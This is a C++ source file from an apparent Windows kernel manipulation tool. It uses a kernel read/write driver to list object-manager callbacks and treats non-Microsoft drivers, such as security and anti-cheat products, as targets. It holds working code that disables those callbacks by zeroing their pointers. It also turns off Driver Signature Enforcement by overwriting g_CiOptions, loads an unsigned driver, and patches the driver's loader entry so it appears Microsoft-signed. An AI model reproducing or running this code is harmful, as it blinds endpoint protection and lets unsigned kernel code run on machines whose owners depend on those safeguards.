#include <Windows.h>
#include <winternl.h>
#include <Sddl.h>
#include <psapi.h>
#include <cstdio>
#include <vector>
#include <string>
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "jutil.h"
#include "ansi.h"
#include "commands.h"

// ─── ObRegisterCallbacks enumeration and control ──────────────────────────────
//
// _OBJECT_TYPE layout (Windows 10 x64, all modern builds including 22H2):
//   +0x0C8  CallbackList : LIST_ENTRY  (head of OB_CALLBACK_ENTRY linked list)
//
// OB_CALLBACK_ENTRY (per ObRegisterCallbacks operation registration):
//   +0x000  CallbackList  : LIST_ENTRY
//   +0x010  Operations    : DWORD  (1=CREATE, 2=DUPLICATE)
//   +0x014  Enabled       : BYTE
//   +0x018  Entry         : QWORD  (back-ptr to OB_CALLBACK registration handle)
//   +0x020  ObjectType    : QWORD
//   +0x028  PreOperation  : QWORD  (function pointer, our main target)
//   +0x030  PostOperation : QWORD  (function pointer)

#define OBJ_TYPE_CALLBACKLIST  0x0C8
#define OBE_OPERATIONS         0x010
#define OBE_ENABLED            0x014
#define OBE_PREOPERATION       0x028
#define OBE_POSTOPERATION      0x030

struct ObEntry {
    DWORD64     entryAddr;
    DWORD64     preOp;
    DWORD64     postOp;
    DWORD       operations;
    BYTE        enabled;
    const wchar_t* preOwner;
    DWORD64     preOwnerBase;
    DWORD64     preOwnerOff;
    const wchar_t* postOwner;
    DWORD64     postOwnerBase;
    DWORD64     postOwnerOff;
};

static std::vector<ObEntry> ScanType(const char* label, DWORD64 typeVarAddr) {
    std::vector<ObEntry> v;

    DWORD64 objType = g_drv->Rd64(typeVarAddr);
    if (!g_drv->IsKernelVA(objType)) {
        printf("  [!] %s: invalid OBJECT_TYPE pointer\n", label);
        return v;
    }

    DWORD64 listHead = objType + OBJ_TYPE_CALLBACKLIST;
    DWORD64 flink    = g_drv->Rd64(listHead);
    if (!g_drv->IsKernelVA(flink) || flink == listHead) return v;

    DWORD64 cur = flink;
    for (int guard = 0; cur != listHead && guard < 64; guard++) {
        ObEntry e{};
        e.entryAddr  = cur;
        e.operations = g_drv->Rd32(cur + OBE_OPERATIONS);
        e.enabled    = g_drv->Rd8 (cur + OBE_ENABLED);
        e.preOp      = g_drv->Rd64(cur + OBE_PREOPERATION);
        e.postOp     = g_drv->Rd64(cur + OBE_POSTOPERATION);
        KUtil::FindDriverByAddr(e.preOp,  &e.preOwner,  &e.preOwnerOff);
        KUtil::FindDriverByAddr(e.postOp, &e.postOwner, &e.postOwnerOff);
        v.push_back(e);
        cur = g_drv->Rd64(cur); // Flink
    }
    return v;
}

// Returns true if driver name looks like a non-Microsoft security/game product
static bool IsSuspiciousDriver(const wchar_t* name) {
    if (!name) return false;
    static const wchar_t* known_ms[] = {
        L"ntoskrnl.exe", L"hal.dll", L"WdFilter.sys", L"CI.dll",
        L"ksecdd.sys",   L"cng.sys", L"VerifierExt.sys", nullptr
    };
    for (int i = 0; known_ms[i]; i++)
        if (_wcsicmp(name, known_ms[i]) == 0) return false;
    return true;
}

static void PrintEntry(int idx, const ObEntry& e, const char* typeLabel) {
    char ops[32]{};
    if (e.operations & 1) strcat_s(ops, "CREATE");
    if (e.operations & 2) { if (ops[0]) strcat_s(ops, "|"); strcat_s(ops, "DUPLICATE"); }

    // Color: disabled = dim, suspicious = red, active = yellow
    const char* entryColor = A_RESET;
    if (!e.enabled)                                          entryColor = A_DIM;
    else if (IsSuspiciousDriver(e.preOwner))                 entryColor = A_RED;
    else                                                     entryColor = A_YELLOW;

    printf("\n  %s[%d]%s %-8s  Entry:%p  Enabled:%s%u%s  Ops:%s\n",
        A_BOLD, idx, A_RESET,
        typeLabel, (void*)e.entryAddr,
        e.enabled ? A_YELLOW : A_DIM, e.enabled, A_RESET,
        ops);

    if (e.preOp)
        wprintf(L"       Pre : %hs%p%hs  %hs%ls%hs +0x%llx\n",
            entryColor, (void*)e.preOp, A_RESET,
            entryColor, e.preOwner, A_RESET,
            (unsigned long long)e.preOwnerOff);
    else
        printf( "       Pre : (none)\n");

    if (e.postOp)
        wprintf(L"       Post: %p  %ls +0x%llx\n",
            (void*)e.postOp, e.postOwner, (unsigned long long)e.postOwnerOff);
    else
        printf( "       Post: (none)\n");
}

void CmdObcb(bool doProcess, bool doThread) {
    SetConsoleOutputCP(CP_UTF8);
    KUtil::BuildDriverCache();

    DWORD64 PsProcessType = KUtil::KernelExport("PsProcessType");
    DWORD64 PsThreadType  = KUtil::KernelExport("PsThreadType");

    if (g_jsonMode) {
        printf("{\"command\":\"obcb\",\"callbacks\":[\n");
        bool first = true;
        auto emit = [&](std::vector<ObEntry>& v, const char* typeLabel) {
            for (auto& e : v) {
                char ops[32]{};
                if (e.operations & 1) strcat_s(ops, "CREATE");
                if (e.operations & 2) { if (ops[0]) strcat_s(ops, "|"); strcat_s(ops, "DUPLICATE"); }
                char preOff[32], postOff[32];
                sprintf_s(preOff,  "0x%llx", (unsigned long long)e.preOwnerOff);
                sprintf_s(postOff, "0x%llx", (unsigned long long)e.postOwnerOff);
                if (!first) printf(",\n");
                first = false;
                printf(" {\"type\":%s,\"entry\":%s,\"enabled\":%u,\"operations\":%s,"
                       "\"pre_op\":%s,\"pre_owner\":%s,\"pre_offset\":%s,"
                       "\"post_op\":%s,\"post_owner\":%s,\"post_offset\":%s}",
                    JEscape(typeLabel).c_str(),
                    JAddr(e.entryAddr).c_str(),
                    (unsigned)e.enabled,
                    JEscape(ops).c_str(),
                    JAddr(e.preOp).c_str(),
                    e.preOp  ? JEscape(e.preOwner).c_str()  : "null",
                    e.preOp  ? JEscape(preOff).c_str()      : "null",
                    JAddr(e.postOp).c_str(),
                    e.postOp ? JEscape(e.postOwner).c_str() : "null",
                    e.postOp ? JEscape(postOff).c_str()     : "null");
            }
        };
        if (doProcess) { auto v = ScanType("Process", PsProcessType); emit(v, "Process"); }
        if (doThread)  { auto v = ScanType("Thread",  PsThreadType);  emit(v, "Thread");  }
        printf("\n]}\n");
        return;
    }

    int total = 0;

    if (doProcess) {
        printf("\n=== Process ObCallbacks ===\n");
        auto v = ScanType("Process", PsProcessType);
        if (v.empty()) { printf("  (none)\n"); }
        else for (int i = 0; i < (int)v.size(); i++) PrintEntry(total + i, v[i], "Process");
        total += (int)v.size();
    }

    if (doThread) {
        printf("\n=== Thread ObCallbacks ===\n");
        auto v = ScanType("Thread", PsThreadType);
        if (v.empty()) { printf("  (none)\n"); }
        else for (int i = 0; i < (int)v.size(); i++) PrintEntry(total + i, v[i], "Thread");
        total += (int)v.size();
    }

    printf("\n  Total: %d callback entries\n\n", total);
}

static void SetEntryEnabled(DWORD64 targetPreOp, BYTE val) {
    KUtil::BuildDriverCache();
    DWORD64 typeVars[] = {
        KUtil::KernelExport("PsProcessType"),
        KUtil::KernelExport("PsThreadType")
    };

    bool found = false;
    for (auto tv : typeVars) {
        DWORD64 objType  = g_drv->Rd64(tv);
        if (!g_drv->IsKernelVA(objType)) continue;
        DWORD64 listHead = objType + OBJ_TYPE_CALLBACKLIST;
        DWORD64 cur      = g_drv->Rd64(listHead);
        for (int guard = 0; g_drv->IsKernelVA(cur) && cur != listHead && guard < 64; guard++) {
            DWORD64 pre = g_drv->Rd64(cur + OBE_PREOPERATION);
            if (pre == targetPreOp) {
                const wchar_t* owner; DWORD64 off;
                KUtil::FindDriverByAddr(pre, &owner, &off);
                wprintf(L"  [*] Found: %p  %ls +0x%llx\n", (void*)pre, owner, (unsigned long long)off);
                printf("  [*] Entry @ %p\n", (void*)cur);
                if (val == 0) {
                    g_drv->Wr8 (cur + OBE_ENABLED,      0);
                    g_drv->Wr64(cur + OBE_PREOPERATION,  0);
                    g_drv->Wr64(cur + OBE_POSTOPERATION, 0);
                    printf("  [+] Disabled (Enabled=0, PreOp=0, PostOp=0)\n");
                } else {
                    g_drv->Wr8(cur + OBE_ENABLED, 1);
                    printf("  [+] Enabled=1 set\n");
                }
                found = true;
            }
            cur = g_drv->Rd64(cur);
        }
    }
    if (!found)
        printf("  [!] No entry found with PreOperation == %p\n", (void*)targetPreOp);
}

void CmdDisable(unsigned long long addr) { SetConsoleOutputCP(CP_UTF8); SetEntryEnabled((DWORD64)addr, 0); }
void CmdEnable (unsigned long long addr) { SetConsoleOutputCP(CP_UTF8); SetEntryEnabled((DWORD64)addr, 1); }

// ── Get kernel VA of an open handle (via SystemExtendedHandleInformation) ──────
// Duplicated from cmd_objdir.cpp logic.
static DWORD64 HandleToKernelVA(HANDLE h) {
    typedef NTSTATUS (NTAPI* PFN_NtQSI)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (PFN_NtQSI)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    const ULONG SystemExtendedHandleInformation = 0x40;
    DWORD ourPid = GetCurrentProcessId();

    ULONG sz = 1 << 20;
    std::vector<BYTE> buf(sz);
    ULONG ret = 0;
    NTSTATUS st;
    for (int i = 0; i < 4; i++) {
        st = NtQSI(SystemExtendedHandleInformation, buf.data(), sz, &ret);
        if (st != (NTSTATUS)0xC0000004) break;
        sz = ret + 65536;
        buf.resize(sz);
    }
    if (st < 0) return 0;

    ULONG_PTR count = *(ULONG_PTR*)buf.data();
    BYTE* base = buf.data() + 0x10;
    for (ULONG_PTR i = 0; i < count; i++) {
        BYTE* e = base + i * 0x28;
        if ((DWORD)*(ULONG_PTR*)(e + 0x08) == ourPid &&
            (HANDLE)*(ULONG_PTR*)(e + 0x10) == h)
            return *(DWORD64*)(e + 0x00);
    }
    return 0;
}

// ── Find g_CiOptions in CI.dll ────────────────────────────────────────────────
// Strategy: load CI.dll into user-mode (no resolution), get CiInitialize RVA,
// scan its prologue for the first MOV r32,[RIP+disp32] (8B ?? ModRM=RIP-rel),
// resolve to CI.dll kernel base + RVA.
// This gives us the kernel VA of g_CiOptions (DSE flag DWORD in CI.dll .data).
static DWORD64 FindCiOptionsVA() {
    KUtil::BuildDriverCache();
    const auto& drvs = KUtil::GetDrivers();
    DWORD64 ciBase = 0;
    for (auto& d : drvs)
        if (_wcsicmp(d.name, L"CI.dll") == 0) { ciBase = d.base; break; }
    if (!ciBase) { printf("%s[!]%s CI.dll not found in driver list\n", A_RED, A_RESET); return 0; }

    HMODULE hCI = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hCI) { printf("%s[!]%s LoadLibraryEx(CI.dll) failed: %lu\n", A_RED, A_RESET, GetLastError()); return 0; }

    BYTE* pCiInit = (BYTE*)GetProcAddress(hCI, "CiInitialize");
    if (!pCiInit) { FreeLibrary(hCI); printf("%s[!]%s CiInitialize not exported\n", A_RED, A_RESET); return 0; }

    // g_CiOptions is stored in an internal function (CipInitializeWithPolicy) called
    // at the END of CiInitialize, after the original options value (first param) is
    // reloaded into ECX: "MOV ECX, saved_reg ; CALL CipInitializeWithPolicy".
    //
    // Strategy: find the LAST E8 CALL near in CiInitialize's first 128 bytes,
    // then scan that function's first 64 bytes for the first
    //   [REX] 89 ModRM(RIP-rel) disp32
    // store instruction that writes into CI.dll's address range → g_CiOptions.
    //
    // We use the LAST CALL because the first/middle CALLs (CipInitialize, etc.)
    // may also contain RIP-relative stores to other globals.
    DWORD64 ciUserBase = (DWORD64)(ULONG_PTR)hCI;
    DWORD64 ciEnd      = ciUserBase + 0x200000; // generous upper bound

    auto ScanForStore = [&](BYTE* fn, DWORD64 fnUserVA) -> DWORD64 {
        for (int i = 0; i < 64 - 6; i++) {
            int off = ((fn[i] & 0xF0) == 0x40) ? 1 : 0; // optional REX
            if (fn[i+off] != 0x89) continue;
            BYTE modrm = fn[i+off+1];
            if ((modrm & 0xC7) != 0x05) continue;
            int32_t disp = 0;
            memcpy(&disp, fn + i + off + 2, 4);
            DWORD64 target = fnUserVA + i + off + 6 + (int64_t)disp;
            if (target >= ciUserBase && target < ciEnd) {
                return target - ciUserBase; // return RVA
            }
        }
        return 0;
    };

    DWORD64 result = 0;

    // Find the LAST E8 (CALL near) in CiInitialize's first 128 bytes
    int lastCallOff = -1;
    for (int i = 0; i < 120; i++) {
        if (pCiInit[i] == 0xE8) lastCallOff = i;
    }

    if (lastCallOff >= 0) {
        int32_t disp = 0;
        memcpy(&disp, pCiInit + lastCallOff + 1, 4);
        DWORD64 targetVA = (DWORD64)(ULONG_PTR)pCiInit + lastCallOff + 5 + (int64_t)disp;
        if (targetVA >= ciUserBase && targetVA < ciEnd)
            result = ScanForStore((BYTE*)(ULONG_PTR)targetVA, targetVA);
    }

    if (result) {
        DWORD64 kernelVA = ciBase + result;
        printf("%s[*]%s g_CiOptions: CI.dll+0x%llX = kernel 0x%llX\n",
               A_CYAN, A_RESET, (unsigned long long)result, (unsigned long long)kernelVA);
        result = kernelVA;
    }

    FreeLibrary(hCI);
    if (!result) printf("%s[!]%s g_CiOptions pattern not found\n", A_RED, A_RESET);
    return result;  // already converted to kernel VA above (or 0)
}

using NtLoadDriver_t   = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using NtUnloadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);

void CmdObcbInstall(const char* sysPath) {
    SetConsoleOutputCP(CP_UTF8);

    // Default: obcb_guard.sys next to ObMaster.exe
    char defaultPath[MAX_PATH]{};
    if (!sysPath || !sysPath[0]) {
        GetModuleFileNameA(nullptr, defaultPath, MAX_PATH - 1);
        char* slash = strrchr(defaultPath, '\\');
        if (slash) *(slash+1) = '\0';
        strcat_s(defaultPath, "obcb_guard.sys");
        sysPath = defaultPath;
    }
    printf("\n%s[*]%s obcb-install: %s\n", A_CYAN, A_RESET, sysPath);

    // ── 1. Enable SeLoadDriverPrivilege via kernel token patch ────────────────
    CmdEnablePriv("SeLoadDriverPrivilege");

    // ── 2. Write HKLM service key (admin required, more reliable than HKCU) ──────
    wchar_t sysPathW[MAX_PATH]{};
    MultiByteToWideChar(CP_ACP, 0, sysPath, -1, sysPathW, MAX_PATH - 1);
    const wchar_t* fname = wcsrchr(sysPathW, L'\\');
    fname = fname ? fname + 1 : sysPathW;
    wchar_t svcName[64]{};
    wcsncpy_s(svcName, fname, 63);
    wchar_t* dot = wcsrchr(svcName, L'.');
    if (dot) *dot = L'\0';

    wchar_t regKey[256];
    swprintf_s(regKey, L"SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hk{};
    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regKey, 0, nullptr,
                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) {
        printf("%s[!]%s RegCreateKeyEx(HKLM) failed: %ld\n", A_RED, A_RESET, rc);
        return;
    }
    DWORD type = 1, start = 3, err = 1;
    wchar_t ntPath[MAX_PATH];
    swprintf_s(ntPath, L"\\??\\%s", sysPathW);
    RegSetValueExW(hk, L"Type",         0, REG_DWORD,      (BYTE*)&type,  4);
    RegSetValueExW(hk, L"Start",        0, REG_DWORD,      (BYTE*)&start, 4);
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD,      (BYTE*)&err,   4);
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ,
                   (BYTE*)ntPath, (DWORD)((wcslen(ntPath)+1)*sizeof(wchar_t)));
    RegCloseKey(hk);
    printf("%s[+]%s HKLM service key written: %ls\n", A_GREEN, A_RESET, ntPath);

    // ── 3. Build NtLoadDriver registry path (HKLM) ───────────────────────────
    wchar_t regPath[512];
    swprintf_s(regPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    printf("%s[*]%s NtLoadDriver path: %ls\n", A_CYAN, A_RESET, regPath);

    UNICODE_STRING us{};
    us.Length        = (USHORT)(wcslen(regPath) * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    us.Buffer        = regPath;

    auto* NtLoadDriver = (NtLoadDriver_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtLoadDriver");
    if (!NtLoadDriver) {
        printf("%s[!]%s NtLoadDriver not in ntdll\n", A_RED, A_RESET);
        RegDeleteKeyW(HKEY_LOCAL_MACHINE, regKey);
        return;
    }

    // ── 4. Disable DSE (g_CiOptions = 0) ─────────────────────────────────────
    DWORD64 ciOptVA  = FindCiOptionsVA();
    DWORD   origCiOpt = 0;
    if (ciOptVA) {
        origCiOpt = g_drv->Rd32(ciOptVA);
        printf("%s[*]%s g_CiOptions = 0x%08X — disabling DSE\n", A_CYAN, A_RESET, origCiOpt);
        g_drv->Wr32(ciOptVA, 0);
    } else {
        printf("%s[!]%s Could not find g_CiOptions — NtLoadDriver will likely fail (0xC0000022)\n",
               A_YELLOW, A_RESET);
    }

    // ── 5. NtLoadDriver ───────────────────────────────────────────────────────
    NTSTATUS status = NtLoadDriver(&us);

    // ── 6. Restore DSE immediately ────────────────────────────────────────────
    if (ciOptVA) {
        g_drv->Wr32(ciOptVA, origCiOpt);
        printf("%s[*]%s g_CiOptions restored to 0x%08X\n", A_CYAN, A_RESET, origCiOpt);
    }

    if (!NT_SUCCESS(status) && status != (NTSTATUS)0xC000010E) {
        // Load failed — clean up key now
        RegDeleteKeyW(HKEY_LOCAL_MACHINE, regKey);
        printf("%s[!]%s NtLoadDriver failed: 0x%08X\n", A_RED, A_RESET, status);
        return;
    }
    // Load succeeded — keep key alive so NtUnloadDriver can find it later.
    // Key is deleted by /force-stop or /drv-unload after unload completes.
    printf("%s[+]%s NtLoadDriver OK (0x%08X) — %ls loaded (Phase-1).\n",
           A_GREEN, A_RESET, status, svcName);

    // ── Phase-2: open device, chase handle→KLDR, patch, then send IOCTL ─────────
    //
    // MmVerifyCallbackFunctionCheckFlags checks KLDR_DATA_TABLE_ENTRY.SignatureLevel.
    // When DSE-bypassed the loader leaves SignatureLevel=0.  We patch it to
    // SE_SIGNING_LEVEL_MICROSOFT (0x0C) via the kernel VA chain:
    //   CreateFile(\\.\ObcbGuard)
    //     → HandleToKernelVA()  → DEVICE_OBJECT kernel VA
    //     → DEVICE_OBJECT+0x008 → DRIVER_OBJECT VA
    //     → DRIVER_OBJECT+0x028 → KLDR_DATA_TABLE_ENTRY VA (DriverSection)
    //
    // KLDR_DATA_TABLE_ENTRY layout (Win10 19041/19045 x64):
    //   +0x06E  SignatureLevel  BYTE   SE_SIGNING_LEVEL_MICROSOFT = 0x0C
    //   +0x06F  SignatureType   BYTE   SE_IMAGE_SIGNATURE_TYPE_CATALOG_CACHED = 0x01

    // CTL_CODE(0x8000, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS) = 0x80002003
    const DWORD IOCTL_OBCB_REGISTER = CTL_CODE(0x8000, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS);

    // Open the device the freshly-loaded driver created
    HANDLE hDev = CreateFileW(L"\\\\.\\ObcbGuard",
                              GENERIC_READ | GENERIC_WRITE,
                              0, nullptr, OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("%s[!]%s CreateFile(\\\\.\\ObcbGuard) failed: %lu\n",
               A_RED, A_RESET, GetLastError());
        return;
    }

    // Walk: handle → DEVICE_OBJECT → DRIVER_OBJECT → DriverSection (KLDR)
    DWORD64 devObj = HandleToKernelVA(hDev);
    if (!devObj) {
        printf("%s[!]%s HandleToKernelVA failed — cannot locate KLDR\n", A_YELLOW, A_RESET);
    } else {
        DWORD64 drvObj = g_drv->Rd64(devObj + 0x008);  // DEVICE_OBJECT.DriverObject
        DWORD64 kldr   = g_drv->Rd64(drvObj + 0x028);  // DRIVER_OBJECT.DriverSection

        printf("%s[*]%s DevObj=0x%llX  DrvObj=0x%llX  KLDR=0x%llX\n",
               A_CYAN, A_RESET,
               (unsigned long long)devObj,
               (unsigned long long)drvObj,
               (unsigned long long)kldr);

        if (g_drv->IsKernelVA(kldr)) {
            BYTE origSigLvl  = g_drv->Rd8(kldr + 0x06E);
            BYTE origSigType = g_drv->Rd8(kldr + 0x06F);
            printf("%s[*]%s KLDR SignatureLevel=0x%02X SignatureType=0x%02X — patching to 0x0C/0x01\n",
                   A_CYAN, A_RESET, origSigLvl, origSigType);
            g_drv->Wr8(kldr + 0x06E, 0x0C);  // SE_SIGNING_LEVEL_MICROSOFT
            g_drv->Wr8(kldr + 0x06F, 0x01);  // SE_IMAGE_SIGNATURE_TYPE_CATALOG_CACHED
            printf("%s[+]%s KLDR patched.\n", A_GREEN, A_RESET);
        } else {
            printf("%s[!]%s KLDR pointer 0x%llX looks invalid — ObRegisterCallbacks may fail\n",
                   A_YELLOW, A_RESET, (unsigned long long)kldr);
        }
    }

    // Send IOCTL to trigger ObRegisterCallbacks inside the driver
    DWORD bytesRet = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_OBCB_REGISTER,
                               nullptr, 0, nullptr, 0, &bytesRet, nullptr);
    CloseHandle(hDev);

    if (ok) {
        printf("%s[+]%s ObRegisterCallbacks activated via IOCTL.\n", A_GREEN, A_RESET);
        printf("%s[*]%s Run /obcb to verify PreOp entry.\n"
               "%s[*]%s Unload with /drv-unload %ls <DriverObject_va>\n\n",
               A_CYAN, A_RESET, A_CYAN, A_RESET, svcName);
    } else {
        printf("%s[!]%s IOCTL_OBCB_REGISTER failed: %lu\n", A_RED, A_RESET, GetLastError());
    }
}
